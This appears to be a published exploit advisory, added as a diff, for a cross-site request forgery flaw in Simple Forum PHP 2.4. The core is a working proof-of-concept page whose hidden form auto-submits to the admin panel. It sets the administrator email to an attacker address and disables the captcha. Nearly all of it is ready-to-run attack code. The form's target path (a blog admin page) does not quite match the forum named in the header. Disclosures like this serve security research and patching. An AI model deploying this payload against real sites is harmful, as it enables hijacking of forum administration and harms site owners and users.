@@ -1,0 +1,39 @@
+<!--
+=====================================================
+# Simple Forum PHP 2.4 - Cross-Site Request Forgery (Edit Options)
+=====================================================
+# Vendor Homepage: http://simpleforumphp.com
+# Date: 14 Oct 2016
+# Demo Link : http://simpleforumphp.com/forum/admin.php
+# Version : 2.4
+# Platform : WebApp - PHP
+# Author: Ashiyane Digital Security Team
+# Contact: hehsan979@gmail.com
+=====================================================
+# Exploit:
+-->
+<html>
+  <!-- CSRF PoC -->
+  <body>
+    <form action="http://localhost/blog/admin.php" method="POST">
+      <input type="hidden" name="act" value="addPost" />
+	  <input type="hidden" name="act" value="updateOptionsAdmin" />
+	  <input type="hidden" name="email" value="attacker@mail.com" />
+	  <input type="hidden" name="captcha" value="nocap" /> <!--Set No
+Captcha(unsecured)-->
+	  <input type="hidden" name="captcha_theme" value="White theme" />
+	  <input type="hidden" name="items_link"
+value="http://localhost/demo_forum.php" />
+	  <input type="hidden" name="time_zone" value="" />
+      <input type="submit" value="Submit request" />
+	  </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+  </body>
+</html>
+<!--
+=====================================================
+# Discovered By : Ehsan Hosseini
+=====================================================
+-->
